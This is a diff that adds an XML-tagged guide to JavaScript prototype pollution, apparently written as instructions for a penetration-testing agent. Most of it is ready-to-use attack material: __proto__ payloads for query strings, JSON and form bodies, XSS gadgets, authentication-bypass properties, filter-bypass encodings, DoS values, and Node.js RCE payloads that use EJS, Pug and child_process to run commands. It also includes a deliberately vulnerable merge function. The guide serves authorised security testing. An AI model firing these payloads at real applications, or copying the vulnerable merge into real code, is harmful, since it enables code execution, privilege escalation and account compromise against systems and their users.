@@ -1,0 +1,339 @@
+<prototype_pollution_guide>
+<title>PROTOTYPE POLLUTION</title>
+
+<critical>Prototype pollution is a JavaScript vulnerability that allows attackers to modify the prototype of base objects (Object.prototype). This can lead to property injection, denial of service, authentication bypass, and remote code execution in both client-side and server-side contexts.</critical>
+
+<scope>
+- Client-side JavaScript applications (browsers)
+- Server-side Node.js applications
+- JSON parsing and object merging operations
+- Query string parsing libraries
+- Configuration management and deep merge utilities
+</scope>
+
+<methodology>
+1. Identify object merge, extend, clone, or deep copy operations accepting user input.
+2. Test property injection via __proto__, constructor.prototype, or prototype paths.
+3. Verify pollution by checking if injected properties appear on new objects.
+4. Identify gadgets that read from polluted properties to achieve impact.
+5. Chain pollution with gadgets for XSS, authentication bypass, or RCE.
+</methodology>
+
+<pollution_vectors>
+<proto_property>
+{% raw %}
+# Direct __proto__ pollution
+{"__proto__": {"polluted": true}}
+{"__proto__": {"isAdmin": true}}
+
+# Nested pollution
+{"constructor": {"prototype": {"polluted": true}}}
+
+# URL parameter pollution (query string parsers)
+?__proto__[polluted]=true
+?constructor[prototype][polluted]=true
+?__proto__.polluted=true
+
+# JSON pollution
+JSON.parse('{"__proto__": {"polluted": true}}')
+{% endraw %}
+</proto_property>
+
+<vulnerable_patterns>
+{% raw %}
+# Recursive merge/extend (vulnerable)
+function merge(target, source) {
+  for (let key in source) {
+    if (typeof source[key] === 'object') {
+      target[key] = merge(target[key] || {}, source[key]);
+    } else {
+      target[key] = source[key];
+    }
+  }
+  return target;
+}
+
+# Vulnerable libraries (check versions)
+# - lodash (_.merge, _.set, _.setWith) - fixed in 4.17.12+
+# - jQuery ($.extend) - deep extend vulnerable
+# - deep-extend - vulnerable versions exist
+# - defaults-deep
+# - merge-deep
+# - hoek - fixed versions available
+{% endraw %}
+</vulnerable_patterns>
+</pollution_vectors>
+
+<detection_techniques>
+<basic_detection>
+{% raw %}
+# Client-side detection
+// Before pollution
+console.log({}.polluted);  // undefined
+
+// Attempt pollution via vulnerable function
+vulnerableFunction({"__proto__": {"polluted": "yes"}});
+
+// After pollution
+console.log({}.polluted);  // "yes" if vulnerable
+
+# Node.js detection
+const payload = JSON.parse('{"__proto__": {"polluted": true}}');
+merge({}, payload);
+console.log({}.polluted);  // true if vulnerable
+{% endraw %}
+</basic_detection>
+
+<http_detection>
+{% raw %}
+# Test via query parameters
+GET /api/endpoint?__proto__[test]=polluted HTTP/1.1
+
+# Test via JSON body
+POST /api/endpoint HTTP/1.1
+Content-Type: application/json
+
+{"__proto__": {"test": "polluted"}}
+
+# Test via form data
+POST /api/endpoint HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+
+__proto__[test]=polluted
+
+# Response analysis
+# Look for injected property in subsequent responses
+# Check if error messages reference the polluted property
+# Monitor for behavioral changes indicating pollution
+{% endraw %}
+</http_detection>
+
+<timing_detection>
+{% raw %}
+# Some gadgets cause timing differences
+{"__proto__": {"length": 1000000}}  # Array.prototype pollution
+{"__proto__": {"0": "x"}}           # Sparse array pollution
+
+# DoS via pollution
+{"__proto__": {"toString": "malicious"}}  # Causes errors
+{% endraw %}
+</timing_detection>
+</detection_techniques>
+
+<client_side_exploitation>
+<xss_gadgets>
+{% raw %}
+# innerHTML gadget (if code reads from prototype for HTML content)
+{"__proto__": {"innerHTML": "<img src=x onerror=alert(1)>"}}
+
+# srcdoc gadget (iframe)
+{"__proto__": {"srcdoc": "<script>alert(1)</script>"}}
+
+# jQuery $.fn extension
+{"__proto__": {"html": "<script>alert(1)</script>"}}
+
+# Event handler gadgets
+{"__proto__": {"onclick": "alert(1)"}}
+{"__proto__": {"onload": "alert(1)"}}
+
+# Template literal gadget
+{"__proto__": {"source": "malicious template"}}
+{% endraw %}
+</xss_gadgets>
+
+<dom_gadgets>
+{% raw %}
+# URL/location gadgets
+{"__proto__": {"href": "javascript:alert(1)"}}
+{"__proto__": {"url": "javascript:alert(1)"}}
+
+# Configuration override
+{"__proto__": {"debug": true}}
+{"__proto__": {"expose": true}}
+
+# Fetch/XHR gadgets
+{"__proto__": {"credentials": "include"}}
+{"__proto__": {"mode": "no-cors"}}
+{% endraw %}
+</dom_gadgets>
+
+<library_gadgets>
+{% raw %}
+# Vue.js
+{"__proto__": {"v-show": "false"}}
+{"__proto__": {"style": "expression(alert(1))"}}  # IE only
+
+# AngularJS
+{"__proto__": {"ng-init": "constructor.constructor('alert(1)')())"}}
+
+# Handlebars
+{"__proto__": {"constructor": {"name": "x"}}}
+// Combined with allowedProtoProperties bypass
+
+# Lodash/Underscore template
+{"__proto__": {"sourceURL": "\u000aalert(1)//"}}
+{% endraw %}
+</library_gadgets>
+</client_side_exploitation>
+
+<server_side_exploitation>
+<rce_gadgets>
+{% raw %}
+# Node.js child_process gadgets
+{"__proto__": {"shell": true}}
+{"__proto__": {"shell": "/bin/sh"}}
+// Makes spawn() execute through shell
+
+# Environment variable injection
+{"__proto__": {"env": {"NODE_OPTIONS": "--require=/tmp/malicious.js"}}}
+{"__proto__": {"env": {"ELECTRON_RUN_AS_NODE": "1"}}}
+
+# Command injection via shell
+{"__proto__": {"shell": true, "argv0": "node"}}
+
+# EJS template engine RCE
+{"__proto__": {"client": true}}
+{"__proto__": {"outputFunctionName": "x;process.mainModule.require('child_process').exec('id');x"}}
+
+# Pug template engine RCE
+{"__proto__": {"block": {"type": "Text", "line": "process.mainModule.require('child_process').exec('id')"}}}
+{% endraw %}
+</rce_gadgets>
+
+<authentication_bypass>
+{% raw %}
+# Role/admin property injection
+{"__proto__": {"isAdmin": true}}
+{"__proto__": {"role": "admin"}}
+{"__proto__": {"admin": true}}
+{"__proto__": {"authenticated": true}}
+
+# JWT-related
+{"__proto__": {"algorithm": "none"}}
+{"__proto__": {"verified": true}}
+
+# Authorization bypass
+{"__proto__": {"canAccess": true}}
+{"__proto__": {"permissions": ["admin"]}}
+{% endraw %}
+</authentication_bypass>
+
+<dos_gadgets>
+{% raw %}
+# Crash via toString/valueOf pollution
+{"__proto__": {"toString": {"constructor": {"name": "x"}}}}
+{"__proto__": {"valueOf": null}}
+
+# Memory exhaustion
+{"__proto__": {"length": 999999999}}
+
+# Infinite loop via circular reference (if not handled)
+# Requires specific application behavior
+{% endraw %}
+</dos_gadgets>
+</server_side_exploitation>
+
+<bypass_techniques>
+<sanitization_bypass>
+{% raw %}
+# If __proto__ is filtered
+{"constructor": {"prototype": {"polluted": true}}}
+
+# Unicode bypass
+{"\u005f\u005fproto\u005f\u005f": {"polluted": true}}
+{"__proto\u005f_": {"polluted": true}}
+
+# Alternative property paths
+{"['__proto__']": {"polluted": true}}
+{"__proto__\u0000": {"polluted": true}}
+
+# Case variation (rare)
+{"__PROTO__": {"polluted": true}}
+{% endraw %}
+</sanitization_bypass>
+
+<parser_quirks>
+{% raw %}
+# JSON5 or relaxed JSON parsers
+{__proto__: {polluted: true}}  // Without quotes
+
+# Query string parsers (qs, querystring)
+?__proto__.polluted=true
+?__proto__[polluted]=true
+?constructor.prototype.polluted=true
+
+# Form data parsers
+Content-Type: application/x-www-form-urlencoded
+__proto__[polluted]=true&constructor[prototype][polluted]=true
+{% endraw %}
+</parser_quirks>
+</bypass_techniques>
+
+<common_payloads>
+{% raw %}
+# Authentication bypass
+{"__proto__": {"isAdmin": true}}
+{"__proto__": {"admin": true}}
+{"__proto__": {"role": "administrator"}}
+
+# Client-side XSS
+{"__proto__": {"innerHTML": "<img src=x onerror=alert(document.domain)>"}}
+{"__proto__": {"srcdoc": "<script>alert(1)</script>"}}
+
+# Server-side RCE (Node.js)
+{"__proto__": {"shell": "/proc/self/exe", "argv0": "console.log(require('child_process').execSync('id').toString())//"}}
+{"__proto__": {"shell": true}}
+
+# EJS RCE
+{"__proto__": {"outputFunctionName": "x;process.mainModule.require('child_process').execSync('id');s"}}
+
+# Configuration override
+{"__proto__": {"debug": true}}
+{"__proto__": {"verbose": true}}
+
+# Query string payloads
+?__proto__[isAdmin]=true
+?constructor[prototype][isAdmin]=true
+{% endraw %}
+</common_payloads>
+
+<validation>
+1. Demonstrate property injection by showing new objects inherit polluted properties.
+2. Identify the vulnerable sink (merge, extend, clone function).
+3. Show gadget chain from pollution to impact (XSS, bypass, RCE).
+4. Provide reproducible payload with exact delivery mechanism.
+5. Document the library and version affected.
+</validation>
+
+<false_positives>
+- Object.freeze() or Object.seal() preventing prototype modification
+- Explicit prototype chain validation
+- Libraries using Object.create(null) for prototype-less objects
+- Sanitization of __proto__ and constructor properties
+- Safe merge implementations that skip prototype properties
+</false_positives>
+
+<impact>
+- Remote code execution in Node.js applications
+- Cross-site scripting in browser contexts
+- Authentication and authorization bypass
+- Denial of service through application crashes
+- Data corruption and application state manipulation
+- Session hijacking and privilege escalation
+</impact>
+
+<pro_tips>
+1. Check package.json for known vulnerable versions of merge libraries.
+2. Test both JSON body and query string parameter pollution.
+3. Look for recursive object operations in API endpoints.
+4. Use browser DevTools to verify client-side prototype pollution.
+5. Document the gadget chain clearly for reproducibility.
+6. Check for template engines in Node.js apps (EJS, Pug, Handlebars).
+7. Test with and without JSON Content-Type header.
+8. Look for configuration files loaded and merged from user input.
+9. Check for prototype pollution in GraphQL variable processing.
+10. Monitor for error messages revealing pollution (undefined function calls).
+</pro_tips>
+
+<remember>Prototype pollution requires two components: a vulnerable sink that copies properties to prototypes, and a gadget that reads from prototypes for security-sensitive operations. Finding both is essential for demonstrating impact.</remember>
+</prototype_pollution_guide>
